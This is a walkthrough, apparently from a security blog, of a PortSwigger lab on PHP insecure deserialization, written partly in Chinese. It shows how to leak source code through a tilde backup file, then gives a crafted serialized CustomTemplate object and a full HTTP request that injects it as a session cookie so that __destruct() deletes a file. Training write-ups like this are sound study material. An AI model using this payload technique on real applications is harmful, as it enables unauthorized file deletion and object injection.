---
layout: post
title: "Arbitrary object injection in PHP"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---





# Arbitrary object injection in PHP
```

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: `wiener:peter`

#### Hint

You can sometimes read source code by appending a tilde (`~)` to a filename to retrieve an editor-generated backup file.



該實驗室使用基於序列化的會話機制，因此容易受到任意對象注入的影響。 為了解決實驗室問題，創建並註入一個惡意序列化對像以從 Carlos 的主目錄中刪除 `morale.txt` 文件。 您需要獲得源代碼訪問權限才能解決此實驗。

您可以使用以下憑據登錄到您自己的帳戶：`wiener:peter`

＃＃＃＃ 暗示

您有時可以通過將波浪號 (`~)` 附加到文件名來讀取源代碼，以檢索編輯器生成的備份文件。



```



login - > update email -> 抓包

```http

POST /my-account/change-email HTTP/1.1
Host: 0ae40000045785c2c1b336e700f300c7.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0Z2U0c2txNW43OGpoOXFza243NGtlb3d3NjU1dWw5aSI7fQ%3d%3d
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0ae40000045785c2c1b336e700f300c7.web-security-academy.net
Referer: https://0ae40000045785c2c1b336e700f300c7.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333

```

cookie:
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0Z2U0c2txNW43OGpoOXFza243NGtlb3d3NjU1dWw5aSI7fQ%3d%3d
```


decode
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"tge4skq5n78jh9qskn74keoww655ul9i";}

```

Unserialize
```
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] => User
    [username] => wiener
    [access_token] => tge4skq5n78jh9qskn74keoww655ul9i
)

```



~符號 備份文件名稱:
https://askubuntu.com/questions/173151/what-does-the-tilde-at-the-end-of-a-file-name-stand-for




sitemap 找到
```
https://0ae40000045785c2c1b336e700f300c7.web-security-academy.net/libs/CustomTemplate.php
```


send repeater 
加上~
```
GET /libs/CustomTemplate.php~
```

會出現備份文件

```php
HTTP/1.1 200 OK
Content-Type: text/plain
Set-Cookie: session=; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 1130

<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>


```

看到了一個物件的描述

然後 __destruct() 魔法方法 會刪除 lock_file_path


構造序列化
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

```

base64 encode
```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

這裡有兩個問題
1./home目錄怎來的 (可能要猜，或信息蒐集)

2.在update email 這個請求修改cookie 能觸發 /libs/CustomTemplate.php 嗎。

答案是可以的，這邊你只要當作cookie 就是儲存了一個序列化的物件，代表後端肯定要去反序列化。

而我們找到了 /libs/CustomTemplate.php的源碼，發現有這麼一個物件，於是我們竄改成這個物件。

當後端要取反序列化的時候，解析是我們惡意的，所以會成功。


```http

POST /my-account/change-email HTTP/1.1
Host: 0ab5003f0336fbaac002b52b005200bf.web-security-academy.net
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0ab5003f0336fbaac002b52b005200bf.web-security-academy.net
Referer: https://0ab5003f0336fbaac002b52b005200bf.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333





```


成功。


